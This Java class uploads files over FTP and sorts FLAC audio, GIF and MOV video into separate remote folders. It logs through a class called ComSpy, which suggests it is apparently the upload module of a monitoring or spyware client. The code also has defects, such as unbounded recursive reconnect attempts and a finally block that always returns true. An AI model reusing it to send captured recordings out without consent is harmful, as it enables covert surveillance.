/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package FTP;

import Comman.Tool;
import compy_client.ComSpy;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

/**
 *
 * @author abaza
 */
public class FileUploading extends Thread {

    public static boolean completed, Done = false;
    private final Comman.Tool cTool = new Tool();
    private static FTPClient ftpClient = null;
    private InputStream inputStream = null;
    String ServerUUID, ClientUUID, LocalFile, RemotFile;

    public FileUploading(String SUUID, String CUUID, String Server, String User, String Pass, String LFile, String RFile) {
        String SystemName = cTool.getSystemName();
        if (SystemName.contains("linux")) {
            init(SUUID, CUUID, Server, User, Pass, LFile, RFile);
        } else if (SystemName.contains("windows")) {
            init(SUUID, CUUID, Server, User, Pass, LFile, RFile);
        }
    }

    private void init(String SUUID, String CUUID, String Server, String User, String Pass, String LFile, String RFile) {
        try {
            ftpClient = new FTPClient();
            ftpClient.connect(Server);
            ftpClient.login(User, Pass);
            ftpClient.enterLocalPassiveMode();
            ftpClient.setKeepAlive(true);
            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
            this.ServerUUID = SUUID;
            this.ClientUUID = CUUID;
            this.LocalFile = LFile;
            this.RemotFile = RFile;
        } catch (IOException ex) {
            ftpClient = null;
            init(SUUID, CUUID, Server, User, Pass, LFile, RFile);
        }
    }

    private String getDay() {
        DateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd");
        Calendar cal = Calendar.getInstance();
        return dateFormat.format(cal.getTime());

    }

    private String CreatePathIfNotFind(String Path) {
        try {
            String[] P = Path.split("/");
            FTPFile FF[] = ftpClient.listDirectories(Path);
            boolean Key = true;
            if (FF.length > 0) {
                for (int i = 0; i <= FF.length - 1; i++) {
                    if (!FF[i].getName().equals(P[i])) {
                        ftpClient.makeDirectory(P[i]);
                        ftpClient.changeWorkingDirectory(FF[i].getName());
                    }
                }
                return Path;
            } else {
                Key = true;
            }

            if (Key) {

                for (int d = 0; d <= P.length - 1; d++) {
                    if (P[d].length() > 0) {
                        if (ftpClient.makeDirectory(P[d])) {
                            ComSpy.MessageLog("Create " + P[d]);
                            if (!ftpClient.changeWorkingDirectory(P[d])) {
                                break;
                            }
                        } else {
                            ftpClient.changeWorkingDirectory(P[d]);
                        }
                    }
                }
                return Path;
            }
            return null;
        } catch (IOException ex) {
            return null;
        }
    }

    private String getExtention(String file) {
        File lfile = new File(file);
        String name = lfile.getName();
        try {
            return name.substring(name.lastIndexOf("."));

        } catch (Exception e) {
            return "";
        }
    }

    private String getWithoutExtention(String File) {
        Path F = Paths.get(File, "");
        String fname = F.getFileName().toString();
        int pos = fname.lastIndexOf(".");
        if (pos > 0) {
            fname = fname.substring(0, pos);
        }
        return fname;
    }

    private String getPATH(String File) {
        Path F = Paths.get(File, "");
        String fname = F.getParent().toString();
        return fname;
    }

    private String CreateNewName(String OldFileName) {
        if (OldFileName.length() > 1) {
            String ex = getExtention(OldFileName);
            String Name;
            if (ex.length() > 0) {
                Name = getWithoutExtention(OldFileName) + "_" + getDay() + "_" + ex;
            } else {
                Name = getWithoutExtention(OldFileName) + "_" + getDay() + ".tmp";
            }

            return Name;
        } else {
            return "";
        }
    }

    public void Upload(boolean CreateIfNot) {
        String lFile, rPath;
        if (LocalFile == null || RemotFile == null) {
            ComSpy.MessageLog("File = Null");
            return;
        }
        if ((this.LocalFile.length() <= 1) || (this.RemotFile.length() <= 1)) {
            return;
        } else {
            lFile = this.LocalFile;
            rPath = this.RemotFile;
        }

        switch (getExtention(lFile)) {
            case ".flac":
                if (rPath.endsWith("/")) {
                    rPath += "audio";
                } else {
                    rPath += "/audio";
                }
                break;
            case ".gif":
                if (rPath.endsWith("/")) {
                    rPath += "gif";
                } else {
                    rPath += "/gif";
                }
                break;
            case ".mov":
                if (rPath.endsWith("/")) {
                    rPath += "video";
                } else {
                    rPath += "/video";
                }
                break;
        }

        if (CreateIfNot) {
            String NewPath = CreatePathIfNotFind(rPath);
            if (NewPath != null) {
                if (!NewPath.endsWith("/")) {
                    NewPath += "/" + getWithoutExtention(lFile) + getExtention(lFile);
                } else {
                    NewPath += getWithoutExtention(lFile) + getExtention(lFile);
                }
                this.RemotFile = NewPath;
            }
        }
    }

    public String getFTPFile() {
        return this.RemotFile;
    }

    public boolean isUploaded() {
        return Done;
    }

    @Override
    public void run() {
        try {
            File secondLocalFile = new File(this.LocalFile);
            SizeFile(secondLocalFile, "KB");
//            long size = secondLocalFile.length();
          long size = 0x00FFFFFF;

            String secondRemoteFile = this.RemotFile;
            inputStream = new FileInputStream(secondLocalFile);

            try (OutputStream outputStream = ftpClient.storeFileStream(secondRemoteFile)) {
                byte[] bytesIn = new byte[(int) size];
                int read = 0;
                ComSpy.MessageLog("Start To Uploading " + this.LocalFile + " Length : " + secondLocalFile.length());
                while ((read = inputStream.read(bytesIn)) != -1) {
                    outputStream.write(bytesIn, 0, read);
                }

                Thread.sleep(200);

                inputStream.close();
                outputStream.flush();
                ComSpy.MessageLog("Copy Data is Done");
                completed = true;
                if (completed) {
                    ComSpy.MessageLog("Upload Done " + this.RemotFile);
//                secondLocalFile.delete();
                    Done = true;
                }
            }

            System.gc();
        } catch (IOException ex) {
            System.err.println(ex.getMessage());
            this.RemotFile = this.LocalFile;
            Done = true;
            this.interrupt();
        } catch (InterruptedException ex) {
            System.err.println("Interrupted " + ex.getMessage());
        } finally {
            try {
                if (ftpClient.isConnected()) {
                    ftpClient.logout();
                    ftpClient.disconnect();
                    this.interrupt();
                }
            } catch (IOException ex) {
                this.interrupt();
            }
        }
    }

    public boolean Upload(String pFile) {
        if (pFile.length() <= 1) {
            return false;
        }

        try {
            File firstLocalFile = new File(pFile);

            String firstRemoteFile = this.CreateNewName(pFile);
            inputStream = new FileInputStream(firstLocalFile);
            boolean done = ftpClient.storeFile(firstRemoteFile, inputStream);
            inputStream.close();
            if (done) {
                ComSpy.MessageLog("Uploaded successfully.");
            }
        } catch (FileNotFoundException ex) {
            return false;
        } catch (IOException ex) {
            return false;
        } finally {
            try {
                inputStream.close();
                return true;
            } catch (IOException ex) {
                return false;
            }
        }
    }

    private void SizeFile(File file, String Type) {

        long bytes = file.length();
        long kilobytes = (bytes / 1024);
        long megabytes = (kilobytes / 1024);
        long gigabytes = (megabytes / 1024);
        String Msg = null, Ex = null;
        if (file.getName().endsWith(".flac")) {
            Ex = "FLAC File : ";
        } else if (file.getName().endsWith(".gif")) {
            Ex = "GIF File : ";
        }

        switch (Type) {
            case "B":
                Msg = Ex + bytes + " bytes";
                break;
            case "KB":
                Msg = Ex + kilobytes + " KB";
                break;
            case "MB":
                Msg = Ex + megabytes + " MB";
                break;
            case "GB":
                Msg = Ex + gigabytes + " GB";
                break;
        }
        ComSpy.MessageLog(Msg);
    }

}
